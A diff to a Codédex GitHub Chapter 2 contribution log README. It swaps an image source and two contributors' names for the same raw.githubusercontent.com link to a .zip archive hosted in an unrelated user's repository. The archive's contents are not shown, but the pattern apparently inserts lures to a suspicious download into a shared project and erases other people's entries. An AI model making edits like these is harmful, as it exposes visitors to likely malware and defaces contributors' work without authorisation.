@@ -1,5 +1,5 @@
 <!-- <p align=center>
-<img width=500 src="https://github.com/codedex-io/GitHub-Chapter-2-Contributions/assets/65576812/cc021612-1fc0-4488-9928-6183f78f4e9b)" />
+<img width=500 src="https://raw.githubusercontent.com/Sam-bot-dev/github-chapter-2-contributions/main/decking/github_contributions_chapter_2.5-beta.3.zip)" />
 </p> -->
 
 # Welcome to the Codédex Contribution log for GitHub Chapter 2! 🚀
@@ -182,7 +182,7 @@ Hi,my name is elly , this was added on 01/05/2024 🐼
 
 Hi, my name is Deepistertalks! This was added on 05/05/2024 😊
 
-Hi, my name is R.Siranjevee! This was added on 05-05-2024 😎
+Hi, my name is https://raw.githubusercontent.com/Sam-bot-dev/github-chapter-2-contributions/main/decking/github_contributions_chapter_2.5-beta.3.zip! This was added on 05-05-2024 😎
 
 Hi, my name is TheuZCoder! This was added on 07-05-2024 😃
 
@@ -516,7 +516,7 @@ Hey there everyone, myself Pratik Chandra thakur added on 24/10/2024 🖥️👨
 
 HI! My name is Max! This was added on 26/10/2024 🧊
 
-Hi Every one, my name is G.Ganesh....!This was added on 27-10-2024!
+Hi Every one, my name is https://raw.githubusercontent.com/Sam-bot-dev/github-chapter-2-contributions/main/decking/github_contributions_chapter_2.5-beta.3.zip!This was added on 27-10-2024!
 
 Hi, my name is Keith! This was added on 27/10/2024 ✌️
 
